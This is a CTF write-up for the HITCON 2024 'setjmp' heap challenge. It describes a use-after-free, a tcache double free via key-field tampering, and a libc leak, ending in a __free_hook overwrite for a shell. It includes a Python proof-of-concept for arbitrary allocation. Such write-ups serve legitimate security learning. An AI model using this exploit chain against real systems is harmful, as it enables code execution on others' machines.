# setjmp

## tl;dr

Just a heap 101 practice! Use heap fengshui to leak libc and overwrite `__free_hook` to get shell.

(Which is unintended)

## Solution

A heap note challenge with setjmp and longjmp. But the UAF is trivial.

First, we can start by leaking the heap base. We can free the "root" chunk at the beginning, and even though it is freed, we can still show it. So by showing the user, we can leak the heap base.

This challenge still has a clear UAF (Use-After-Free) vulnerability. Freeing a user will go into the tcache and we can also modify the key field of the tcache chunk. So here, we can free a user, modify the key field of the tcache chunk, and then free it again to cause tcache double free. This will give us an arbitrary allocation primitive.

Here is a POC (Proof of Concept) for arbitrary allocation: (allocating a chunk at 0xDEADBEEF)

{% highlight python %}
def add_user(username,password):
    sla("> ","2")
    sa("> ",username)
    sa("> ",password)
def free_user(username):
    sla("> ","3")
    sa("> ",username)
def change_pass(username,password):
    sla("> ","4")
    sa("> ",username)
    sa("> ",password)
def show_user():
    sla("> ","5")

free_user("root")
show_user()
add_user("aaa","bbb")
add_user("ccc","ddd")
free_user("aaa")
free_user("ccc")
sla("> ","1")
free_user("root")
show_user()
new_user = r.recv(6)
change_pass(new_user,"fake2")
free_user(new_user)
add_user(p64(0xDEADBEEF),p64(0))
add_user("eee","fff")
{% endhighlight %}

Afterwards, we can allocate and modify the size of other user chunk headers, causing the user to be placed in the unsorted bin when freed. It is important to arrange the heap properly because the `prev_inuse` bit of the next chunk is checked when attempting to free into the unsorted bin.

{% highlight c %}
if (__glibc_unlikely (!prev_inuse(nextchunk))) // here
      malloc_printerr ("double free or corruption (!prev)");
{% endhighlight %}

After that we have libc leak and we can use the same method to overwrite `__free_hook` to get shell.

## Exploit Script

See here: [https://github.com/pwn2ooown/CTF-Writeups-Public/blob/main/2024_HITCON_CTF_Qual/setjmp/exp.py](https://github.com/pwn2ooown/CTF-Writeups-Public/blob/main/2024_HITCON_CTF_Qual/setjmp/exp.py)
